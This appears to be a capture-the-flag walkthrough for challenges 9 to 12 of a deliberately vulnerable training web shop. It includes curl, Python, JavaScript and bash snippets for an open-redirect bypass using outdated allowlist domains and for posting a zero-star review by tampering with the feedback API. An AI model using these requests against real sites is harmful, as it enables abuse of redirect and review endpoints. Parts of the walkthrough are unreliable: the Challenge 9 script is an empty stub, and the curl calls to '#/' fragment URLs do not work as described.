# Additional Challenges (9-12)

## Challenge 9: Missing Encoding

### Objective
Retrieve a photo with missing image encoding.

### Solution
1. Upload a photo to Photo Wall
2. Intercept the upload request
3. Remove or modify the image encoding
4. Some images may be stored without proper encoding

```python
# Python script
import requests

def missing_encoding(base_url):
    # Check for improperly encoded images
    response = requests.get(f"{base_url}/assets/public/images/uploads/")
    # Look for base64 images without proper headers
```

---

## Challenge 10: Outdated Allowlist

### Objective
Perform a redirect using an outdated allowlist.

### Solution
The application has an allowlist for redirects but it's outdated:

```bash
# Try these redirect bypasses
curl "https://juice3.wonkatech.org/redirect?to=http://google.com"
curl "https://juice3.wonkatech.org/redirect?to=https://github.com"

# Outdated domains that might work:
# - blockchain.info (now blockchain.com)
# - gratipay.com (defunct)
```

```python
def outdated_allowlist(base_url):
    outdated_domains = [
        "gratipay.com",
        "flattr.com", 
        "blockchain.info"
    ]
    
    for domain in outdated_domains:
        url = f"{base_url}/redirect?to=https://{domain}"
        print(f"Trying: {url}")
```

---

## Challenge 11: Privacy Policy

### Objective
Access the privacy policy page.

### Solution
Multiple methods:
1. Check the footer links
2. Navigate to `/privacy-policy`
3. Look in legal documents
4. Sometimes requires specific navigation

```bash
# Direct access
curl "https://juice3.wonkatech.org/#/privacy-security"
curl "https://juice3.wonkatech.org/privacy"
```

---

## Challenge 12: Zero Stars

### Objective
Give a product zero stars in a review.

### Solution
The rating system typically allows 1-5 stars, but you can manipulate it:

### Method 1: Intercept Request
1. Write a review normally
2. Intercept the POST request
3. Change the rating value to 0
4. Forward the request

### Method 2: API Manipulation
```python
import requests

def zero_stars_review(base_url, auth_token):
    review_data = {
        "ProductId": 1,
        "rating": 0,  # Zero stars
        "comment": "This product deserves zero stars!"
    }
    
    headers = {
        "Authorization": f"Bearer {auth_token}",
        "Content-Type": "application/json"
    }
    
    response = requests.post(
        f"{base_url}/api/Feedbacks/",
        json=review_data,
        headers=headers
    )
    
    print(f"Review posted: {response.status_code}")
```

### Method 3: Browser Console
```javascript
// In browser console after logging in
fetch('/api/Feedbacks/', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + localStorage.getItem('token')
    },
    body: JSON.stringify({
        ProductId: 1,
        rating: 0,
        comment: "Zero stars!"
    })
}).then(r => r.json()).then(console.log);
```

---

## Quick Scripts for All

```bash
#!/bin/bash
# save as: challenges_9_12.sh

TARGET="https://juice3.wonkatech.org"

echo "🎯 Running Challenges 9-12..."

# Challenge 9: Missing Encoding
echo -e "\n📸 Challenge 9: Missing Encoding"
curl -s "${TARGET}/assets/public/images/uploads/" | grep -o 'src="[^"]*"' | head -5

# Challenge 10: Outdated Allowlist
echo -e "\n🔗 Challenge 10: Outdated Allowlist"
curl -s "${TARGET}/redirect?to=https://gratipay.com"
curl -s "${TARGET}/redirect?to=https://blockchain.info"

# Challenge 11: Privacy Policy
echo -e "\n📜 Challenge 11: Privacy Policy"
curl -s "${TARGET}/#/privacy-security" -o /dev/null -w "Privacy Policy: %{http_code}\n"

# Challenge 12: Zero Stars (requires auth)
echo -e "\n⭐ Challenge 12: Zero Stars"
echo "This requires authentication. Use the browser console method after logging in."
```

## Learning Points
- Input validation should be server-side
- Allowlists need regular updates
- All user inputs should be validated
- Rating systems need proper bounds checking